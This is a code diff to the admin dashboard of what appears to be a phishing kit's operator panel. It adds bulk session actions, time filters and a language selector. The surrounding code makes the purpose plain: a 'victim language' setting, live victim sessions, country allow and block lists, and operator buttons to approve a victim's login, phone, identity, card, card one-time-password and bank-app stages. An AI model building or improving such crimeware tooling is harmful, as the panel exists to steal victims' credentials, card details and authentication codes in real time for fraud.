@@ -8,6 +8,7 @@ import { ModalService } from '../services/modal.service';
 import { TranslationService } from '../services/translation.service';
 import { TranslatePipe } from '../pipes/translate.pipe';
 import { COUNTRIES } from '../utils/country-data';
+import { LANG_NAMES } from '../utils/language-map';
 
 type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
@@ -507,14 +508,27 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     <div class="bg-white dark:bg-slate-800 rounded-card shadow-sm border border-slate-100 dark:border-slate-700 overflow-hidden h-full flex flex-col">
                         <div class="px-6 py-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
                             <h3 class="font-bold text-lg text-pp-navy dark:text-white shrink-0 hidden md:block">{{ 'HISTORY' | translate }}</h3>
+
+                            @if(selectedSessionIds().size > 0) {
+                                <div class="flex items-center gap-2 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-600 px-3 py-1.5 rounded-lg shadow-sm animate-fade-in mr-auto md:mr-0">
+                                    <span class="text-xs font-bold text-pp-navy dark:text-white whitespace-nowrap">{{ selectedSessionIds().size }} Selected</span>
+                                    <div class="h-4 w-[1px] bg-slate-200 dark:bg-slate-600 mx-1"></div>
+                                    <button (click)="bulkPin()" class="text-slate-500 hover:text-pp-blue transition-colors" title="Pin/Unpin"><span class="material-icons text-sm">push_pin</span></button>
+                                    <button (click)="bulkExport()" class="text-slate-500 hover:text-green-600 transition-colors" title="Export"><span class="material-icons text-sm">download</span></button>
+                                    <button (click)="bulkDelete()" class="text-slate-500 hover:text-red-500 transition-colors" title="Delete"><span class="material-icons text-sm">delete</span></button>
+                                </div>
+                            }
+
                             <div class="flex items-center gap-2 w-full md:w-auto ml-auto">
                                 <div class="relative flex-1 md:w-64">
                                     <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
                                     <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg focus:outline-none focus:border-pp-blue transition-colors dark:bg-slate-700 dark:text-white">
                                 </div>
-                                <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white">
-                                    <option value="24h">24h</option>
-                                    <option value="all">All</option>
+                                <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white cursor-pointer">
+                                    <option value="6h">Last 6 Hours</option>
+                                    <option value="24h">Last 24 Hours</option>
+                                    <option value="7d">Last 7 Days</option>
+                                    <option value="all">All Time</option>
                                 </select>
                             </div>
                         </div>
@@ -680,11 +694,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                  <div>
                                      <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'VICTIM_LANGUAGE' | translate }}</label>
                                      <select [(ngModel)]="flowSettings.defaultLang" class="pp-input dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                         <option value="en">English</option>
-                                         <option value="fr">Français</option>
-                                         <option value="es">Español</option>
-                                         <option value="de">Deutsch</option>
-                                         <option value="it">Italiano</option>
+                                         <option *ngFor="let l of languageList" [value]="l.code">{{ l.name }}</option>
                                      </select>
                                  </div>
 
@@ -705,8 +715,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                      </div>
                                  </div>
                                  <select [(ngModel)]="currentAdminLang" (change)="changeAdminLanguage(currentAdminLang)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
-                                     <option value="en">English</option>
-                                     <option value="fr">Français</option>
+                                     <option *ngFor="let l of languageList" [value]="l.code">{{ l.name }}</option>
                                  </select>
                              </div>
 
@@ -1261,6 +1270,9 @@ export class AdminDashboardComponent implements OnInit {
 
   countryList = COUNTRIES;
 
+  // Create language list for UI selectors, sorted alphabetically by name
+  languageList = Object.entries(LANG_NAMES).map(([code, name]) => ({ code, name })).sort((a, b) => a.name.localeCompare(b.name));
+
   // Country Selector UI State
   allowedSearch = signal('');
   blockedSearch = signal('');
@@ -1552,10 +1564,10 @@ export class AdminDashboardComponent implements OnInit {
       switch (session.stage) {
           case 'login': return 'APPROVE LOGIN';
           case 'phone_pending': return 'APPROVE PHONE';
-          case 'personal_pending': return 'APPROVE IDENTITY';
-          case 'card_pending': return 'APPROVE CARD';
-          case 'card_otp_pending': return 'APPROVE OTP';
-          case 'bank_app_pending': return 'APPROVE APP';
+          case 'personal_pending': return 'APPROVE_IDENTITY';
+          case 'card_pending': return 'APPROVE_CARD';
+          case 'card_otp_pending': return 'APPROVE_OTP';
+          case 'bank_app_pending': return 'APPROVE_APP';
           default: return 'ACTION NEEDED';
       }
   }
